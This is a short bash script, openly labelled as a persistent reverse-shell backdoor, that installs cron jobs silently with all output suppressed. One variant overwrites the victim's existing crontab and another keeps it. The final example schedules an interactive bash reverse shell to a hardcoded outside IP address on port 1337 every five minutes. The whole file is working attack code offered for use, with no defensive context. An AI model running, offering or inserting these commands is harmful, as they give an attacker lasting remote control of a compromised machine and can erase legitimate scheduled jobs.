
#!/bin/bash

# persistent reverse shell backdoor via crontab

# overwrites existing crontabs
(touch .tab ; echo "* * * * * reverse-shell-of-choice" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1

# keeps existing crontabs
(crontab -l > .tab ; echo "* * * * * reverse-shell-of-choice" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1

# example sending bash reverse shell every 5 min
(touch .tab ; echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/154.49.137.21/1337 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1
